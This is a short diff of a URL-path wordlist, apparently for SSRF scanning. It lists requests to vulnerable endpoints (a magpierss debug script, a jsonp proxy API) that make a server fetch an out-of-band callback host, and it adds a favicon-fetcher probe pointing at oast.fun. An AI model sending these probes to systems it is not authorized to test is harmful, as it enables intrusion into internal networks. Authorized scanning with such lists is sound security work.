@@ -44,3 +44,4 @@
 /usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
 /html/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
 /api/v1/core/proxy/jsonprequest?objresponse=false&websiteproxy=true&escapestring=false&url=http://{{interactsh-url}}
+/getFavicon?host=oast.fun?
